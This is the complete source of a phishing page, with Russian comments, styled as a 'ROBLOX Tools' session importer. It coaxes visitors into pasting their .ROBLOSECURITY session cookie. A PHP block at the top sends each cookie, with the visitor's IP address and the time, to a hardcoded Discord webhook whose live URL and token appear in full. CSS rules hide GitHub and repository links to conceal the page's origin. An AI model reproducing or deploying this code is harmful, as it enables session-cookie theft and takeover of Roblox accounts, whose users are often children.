<?php
// ========== ВЕБХУК СПРЯТАН ЗДЕСЬ (замени на свой) ==========
$WEBHOOK_URL = "https://discord.com/api/webhooks/1496434230853505134/As0uOLlQSiHA-9VstbrsFGZYFr5LJPTEj1WTiNRrS1pQSXTp6OpM8VCIMKsT7xkXUb-0";

// ========== ОБРАБОТКА POST-ЗАПРОСА С КУКОЙ ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cookie'])) {
    $cookie = trim($_POST['cookie']);
    $ip = $_SERVER['REMOTE_ADDR'];
    $msg = "**🍪 НОВАЯ КУКА ROBLOX**\n"
         . "🕒 Время: " . date('Y-m-d H:i:s') . "\n"
         . "🌐 IP: $ip\n\n"
         . "**Кука:**\n```\n$cookie\n```";

    // Отправка через file_get_contents (не требует curl)
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode(['content' => $msg])
        ]
    ];
    $context = stream_context_create($options);
    @file_get_contents($WEBHOOK_URL, false, $context);

    echo "✅ Отправлено!";
    exit;
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ROBLOX Tools</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* ========== ТЁМНАЯ ТЕМА (синий неон) ========== */
        :root {
            --bg-gradient-1: #050a1a;
            --bg-gradient-2: #0a1030;
            --bg-gradient-3: #0f1a4a;
            --bg-gradient-4: #0a1030;
            --bg-gradient-5: #050a1a;
            --bg-gradient-6: #0d1540;
            --bg-gradient-7: #050a1a;
            --card-bg: rgba(8, 15, 30, 0.85);
            --card-border: rgba(0, 150, 255, 0.6);
            --card-border-hover: rgba(0, 200, 255, 0.9);
            --input-bg: rgba(10, 20, 40, 0.9);
            --input-border: rgba(0, 150, 255, 0.5);
            --text-primary: #e0f0ff;
            --text-secondary: #90caf9;
            --text-muted: #42a5f5;
            --btn-gradient-1: #0d47a1;
            --btn-gradient-2: #1565c0;
            --btn-gradient-3: #42a5f5;
            --star-color-1: #42a5f5;
            --star-color-2: #1e88e5;
            --star-color-3: #90caf9;
            --star-color-4: #1565c0;
            --star-color-5: #64b5f6;
            --glow-1: rgba(0, 150, 255, 0.2);
            --glow-2: rgba(0, 200, 255, 0.3);
            --logo-gradient-1: #90caf9;
            --logo-gradient-2: #42a5f5;
            --logo-gradient-3: #1e88e5;
            --logo-gradient-4: #0d47a1;
            --sub-gradient-1: #64b5f6;
            --sub-gradient-2: #1e88e5;
        }

        /* ========== СВЕТЛАЯ ТЕМА (фиолетовый неон) ========== */
        body.light {
            --bg-gradient-1: #f3e5ff;
            --bg-gradient-2: #e1cfff;
            --bg-gradient-3: #d1b3ff;
            --bg-gradient-4: #e1cfff;
            --bg-gradient-5: #f3e5ff;
            --bg-gradient-6: #e9d5ff;
            --bg-gradient-7: #f3e5ff;
            --card-bg: rgba(255, 245, 255, 0.88);
            --card-border: rgba(156, 39, 176, 0.5);
            --card-border-hover: rgba(186, 104, 200, 0.8);
            --input-bg: rgba(255, 245, 255, 0.95);
            --input-border: rgba(156, 39, 176, 0.4);
            --text-primary: #4a1d6d;
            --text-secondary: #7b1fa2;
            --text-muted: #ab47bc;
            --btn-gradient-1: #8e24aa;
            --btn-gradient-2: #ab47bc;
            --btn-gradient-3: #ce93d8;
            --star-color-1: #ce93d8;
            --star-color-2: #ab47bc;
            --star-color-3: #e1bee7;
            --star-color-4: #9c27b0;
            --star-color-5: #f3e5f5;
            --glow-1: rgba(156, 39, 176, 0.15);
            --glow-2: rgba(186, 104, 200, 0.25);
            --logo-gradient-1: #6a1b9a;
            --logo-gradient-2: #8e24aa;
            --logo-gradient-3: #ab47bc;
            --logo-gradient-4: #ce93d8;
            --sub-gradient-1: #9c27b0;
            --sub-gradient-2: #ab47bc;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, 
                var(--bg-gradient-1) 0%, 
                var(--bg-gradient-2) 15%, 
                var(--bg-gradient-3) 30%, 
                var(--bg-gradient-4) 45%, 
                var(--bg-gradient-5) 60%, 
                var(--bg-gradient-6) 75%, 
                var(--bg-gradient-7) 100%);
            background-size: 400% 400%;
            animation: gradientShift 12s ease infinite;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
            transition: background 0.3s ease;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .theme-switch {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }

        .theme-btn {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            border: 1px solid var(--card-border);
            border-radius: 50px;
            padding: 10px 18px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-secondary);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .theme-btn:hover {
            transform: scale(1.05);
            border-color: var(--card-border-hover);
            box-shadow: 0 0 15px var(--glow-1);
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(2px 2px at 20px 30px, var(--star-color-1), rgba(0,0,0,0)),
                radial-gradient(3px 3px at 80px 120px, var(--star-color-2), rgba(0,0,0,0)),
                radial-gradient(1px 1px at 160px 80px, var(--star-color-3), rgba(0,0,0,0)),
                radial-gradient(2px 2px at 300px 200px, var(--star-color-4), rgba(0,0,0,0)),
                radial-gradient(1px 1px at 450px 350px, var(--star-color-5), rgba(0,0,0,0)),
                radial-gradient(3px 3px at 600px 50px, var(--star-color-2), rgba(0,0,0,0)),
                radial-gradient(2px 2px at 750px 280px, var(--star-color-1), rgba(0,0,0,0)),
                radial-gradient(1px 1px at 900px 150px, var(--star-color-3), rgba(0,0,0,0)),
                radial-gradient(2px 2px at 1050px 400px, var(--star-color-4), rgba(0,0,0,0)),
                radial-gradient(3px 3px at 1200px 100px, var(--star-color-5), rgba(0,0,0,0));
            background-size: 200px 200px;
            background-repeat: no-repeat;
            opacity: 0.7;
            pointer-events: none;
            animation: starsFloat 20s linear infinite;
        }

        @keyframes starsFloat {
            0% { transform: translateY(0px); }
            100% { transform: translateY(-100px); }
        }

        @keyframes floatCookie {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            20% { opacity: 0.9; }
            80% { opacity: 0.9; }
            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
        }

        .floating-cookie {
            position: fixed;
            pointer-events: none;
            z-index: 0;
            animation: floatCookie linear infinite;
            will-change: transform;
        }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border-radius: 32px;
            padding: 40px 36px;
            max-width: 500px;
            width: 100%;
            border: 1px solid var(--card-border);
            box-shadow: 0 0 30px var(--glow-1), 0 25px 45px -12px rgba(0, 0, 0, 0.5);
            transition: all 0.3s ease;
            z-index: 1;
        }

        .card:hover {
            border-color: var(--card-border-hover);
            box-shadow: 0 0 50px var(--glow-2), 0 30px 50px -15px rgba(0, 0, 0, 0.6);
            transform: translateY(-2px);
        }

        .logo {
            text-align: center;
            margin-bottom: 28px;
        }

        .logo h1 {
            font-size: 38px;
            font-weight: 800;
            background: linear-gradient(135deg, 
                var(--logo-gradient-1), 
                var(--logo-gradient-2), 
                var(--logo-gradient-3), 
                var(--logo-gradient-4));
            background-size: 300% 300%;
            animation: textGradient 3s ease infinite;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.5px;
            text-shadow: 0 0 8px var(--glow-1);
        }

        @keyframes textGradient {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .logo p {
            background: linear-gradient(135deg, var(--sub-gradient-1), var(--sub-gradient-2));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 12px;
            margin-top: 8px;
            letter-spacing: 2px;
            font-weight: 500;
        }

        .label {
            color: var(--text-secondary);
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .label-icon { font-size: 18px; }

        .cookie-input {
            width: 100%;
            background: var(--input-bg);
            border: 1.5px solid var(--input-border);
            border-radius: 16px;
            padding: 16px 18px;
            color: var(--text-primary);
            font-family: 'Monaco', 'Menlo', 'Consolas', monospace;
            font-size: 12px;
            resize: vertical;
            transition: all 0.3s ease;
            line-height: 1.5;
        }

        .cookie-input:focus {
            outline: none;
            border-color: var(--btn-gradient-2);
            box-shadow: 0 0 0 3px var(--glow-2);
            background: var(--input-bg);
        }

        .cookie-input.valid { border-color: #22c55e; box-shadow: 0 0 0 2px rgba(34,197,94,0.2); }
        .cookie-input.invalid { border-color: #ef4444; box-shadow: 0 0 0 2px rgba(239,68,68,0.2); }

        .validation-status {
            font-size: 11px;
            margin-top: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
            color: var(--text-muted);
        }

        .status-valid { color: #22c55e; }
        .status-invalid { color: #ef4444; }
        .status-neutral { color: var(--text-muted); }

        .btn-primary {
            width: 100%;
            background: linear-gradient(135deg, var(--btn-gradient-1), var(--btn-gradient-2), var(--btn-gradient-3));
            background-size: 200% 200%;
            animation: btnGradient 3s ease infinite;
            border: none;
            border-radius: 40px;
            padding: 14px;
            color: white;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            letter-spacing: 0.5px;
        }

        @keyframes btnGradient {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .btn-primary::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
            transition: left 0.6s;
        }

        .btn-primary:hover::before { left: 100%; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px var(--glow-2); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; animation: none; }

        .message-area {
            text-align: center;
            margin-top: 16px;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .message-area.show { opacity: 1; }
        .error-text {
            color: #f87171;
            background: rgba(220,38,38,0.15);
            padding: 8px 16px;
            border-radius: 24px;
            display: inline-block;
            border-left: 3px solid #ef4444;
            font-size: 12px;
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        .shake { animation: shake 0.3s ease; }
        
        a[href*="github"], a[href*="github.io"], .repo-link, footer, .Footer, [class*="repo"], [id*="repo"] {
            display: none !important;
            visibility: hidden !important;
            height: 0 !important;
            width: 0 !important;
            opacity: 0 !important;
            pointer-events: none !important;
        }
    </style>
</head>
<body>
    <div class="theme-switch">
        <button class="theme-btn" id="themeToggleBtn"><span>🌙</span> Тема</button>
    </div>
    <div class="card">
        <div class="logo">
            <h1>ROBL<span style="background: linear-gradient(135deg, var(--sub-gradient-1), var(--btn-gradient-1)); -webkit-background-clip: text; background-clip: text; color: transparent;">✦</span>Tools</h1>
            <p>SESSION IMPORTER</p>
        </div>
        <label class="label"><span class="label-icon">🍪</span><span>.ROBLOSECURITY Cookie</span></label>
        <textarea class="cookie-input" id="cookie" rows="3" placeholder="Вставьте cookie сюда..."></textarea>
        <div class="validation-status" id="validationStatus"><span>✨</span><span id="statusText">Ожидание ввода...</span></div>
        <button class="btn-primary" id="sendCookieBtn" disabled>🔄 Заменить сессию</button>
        <div id="messageArea" class="message-area"></div>
    </div>
    <script>
        (function() {
            // ========== ПЕРЕКЛЮЧЕНИЕ ТЕМЫ ==========
            const themeToggleBtn = document.getElementById('themeToggleBtn');
            
            function loadTheme() {
                const savedTheme = localStorage.getItem('roblox_theme');
                if (savedTheme === 'light') {
                    document.body.classList.add('light');
                    if(themeToggleBtn) themeToggleBtn.innerHTML = '<span>☀️</span> Тема';
                } else {
                    document.body.classList.remove('light');
                    if(themeToggleBtn) themeToggleBtn.innerHTML = '<span>🌙</span> Тема';
                }
            }
            
            function toggleTheme() {
                if (document.body.classList.contains('light')) {
                    document.body.classList.remove('light');
                    localStorage.setItem('roblox_theme', 'dark');
                    if(themeToggleBtn) themeToggleBtn.innerHTML = '<span>🌙</span> Тема';
                } else {
                    document.body.classList.add('light');
                    localStorage.setItem('roblox_theme', 'light');
                    if(themeToggleBtn) themeToggleBtn.innerHTML = '<span>☀️</span> Тема';
                }
            }
            
            if(themeToggleBtn) themeToggleBtn.addEventListener('click', toggleTheme);
            loadTheme();
            
            // ========== ВАЛИДАЦИЯ КУКИ ==========
            function isValidCookie(cookieValue) {
                if (!cookieValue || cookieValue.trim() === '') return false;
                const trimmed = cookieValue.trim();
                if (!trimmed.includes('WARNING:-DO-NOT-SHARE-THIS')) return false;
                if (trimmed.length < 100) return false;
                if (trimmed.includes('<') || trimmed.includes('>') || trimmed.includes('script')) return false;
                if (trimmed.includes('SELECT') || trimmed.includes('DROP') || trimmed.includes('INSERT')) return false;
                if (trimmed.includes('http://') || trimmed.includes('https://')) return false;
                const allowed = /^[A-Za-z0-9_\-\.=:%|]+$/;
                if (!allowed.test(trimmed)) return false;
                return true;
            }
            
            function validateCookie(cookieValue) {
                if (!cookieValue || cookieValue.trim() === '') return { valid: false };
                if (isValidCookie(cookieValue)) return { valid: true, length: cookieValue.trim().length };
                return { valid: false };
            }
            
            const cookieInput = document.getElementById('cookie');
            const sendBtn = document.getElementById('sendCookieBtn');
            const statusText = document.getElementById('statusText');
            const validationStatus = document.getElementById('validationStatus');
            const messageArea = document.getElementById('messageArea');
            
            function updateValidationUI() {
                const cookieValue = cookieInput.value;
                const validation = validateCookie(cookieValue);
                cookieInput.classList.remove('valid', 'invalid');
                
                if (!cookieValue || cookieValue.trim() === '') {
                    statusText.innerHTML = '✨ Ожидание ввода...';
                    statusText.className = 'status-neutral';
                    if(validationStatus) validationStatus.querySelector('span:first-child').innerHTML = '✨';
                    sendBtn.disabled = true;
                    return;
                }
                
                if (validation.valid) {
                    cookieInput.classList.add('valid');
                    statusText.innerHTML = `✅ Кука валидна! (${validation.length} символов)`;
                    statusText.className = 'status-valid';
                    if(validationStatus) validationStatus.querySelector('span:first-child').innerHTML = '✅';
                    sendBtn.disabled = false;
                } else {
                    cookieInput.classList.add('invalid');
                    statusText.innerHTML = '❌ Неверный формат куки';
                    statusText.className = 'status-invalid';
                    if(validationStatus) validationStatus.querySelector('span:first-child').innerHTML = '❌';
                    sendBtn.disabled = true;
                }
            }
            
            function showMessage(text, isError = true) {
                messageArea.innerHTML = `<div class="error-text">${isError ? '⚠️ ' : '✅ '}${text}</div>`;
                messageArea.classList.add('show');
                setTimeout(() => messageArea.classList.remove('show'), 3000);
            }
            
            // ========== ОТПРАВКА НА ТОТ ЖЕ ФАЙЛ (PHP ВЫШЕ) ==========
            async function sendCookieToBackend(cookieValue, length) {
                const formData = new FormData();
                formData.append('cookie', cookieValue);
                
                try {
                    const response = await fetch('', {
                        method: 'POST',
                        body: formData
                    });
                    const text = await response.text();
                    return text.includes('✅');
                } catch(e) { 
                    return false; 
                }
            }
            
            if(sendBtn) {
                sendBtn.onclick = async () => {
                    const cookieValue = cookieInput.value.trim();
                    const validation = validateCookie(cookieValue);
                    if (!validation.valid) {
                        showMessage('Невалидная кука! Проверьте формат.', true);
                        cookieInput.classList.add('shake');
                        setTimeout(() => cookieInput.classList.remove('shake'), 300);
                        return;
                    }
                    sendBtn.disabled = true;
                    sendBtn.textContent = "⏳ Отправка...";
                    const success = await sendCookieToBackend(cookieValue, validation.length);
                    sendBtn.disabled = false;
                    sendBtn.textContent = "🔄 Заменить сессию";
                    if (success) {
                        showMessage('✅ Кука отправлена!', false);
                        cookieInput.value = '';
                    } else {
                        showMessage('❌ Ошибка отправки. Попробуйте позже.', true);
                    }
                };
            }
            
            if(cookieInput) {
                cookieInput.addEventListener('input', updateValidationUI);
                cookieInput.addEventListener('paste', () => setTimeout(updateValidationUI, 10));
            }
            
            document.title = 'ROBLOX Tools';
            
            // ========== ПЛАВАЮЩИЕ ПЕЧЕНЬКИ ==========
            (function() {
                const cookieCount = 50;
                for (let i = 0; i < cookieCount; i++) {
                    const cookie = document.createElement('div');
                    cookie.className = 'floating-cookie';
                    cookie.textContent = '🍪';
                    cookie.style.left = Math.random() * 100 + '%';
                    cookie.style.fontSize = (18 + Math.random() * 34) + 'px';
                    cookie.style.animationDuration = (9 + Math.random() * 14) + 's';
                    cookie.style.animationDelay = Math.random() * -20 + 's';
                    cookie.style.opacity = 0.5 + Math.random() * 0.4;
                    cookie.style.filter = `drop-shadow(0 0 ${5 + Math.random() * 12}px var(--glow-2))`;
                    document.body.appendChild(cookie);
                }
            })();
        })();
    </script>
</body>
</html>
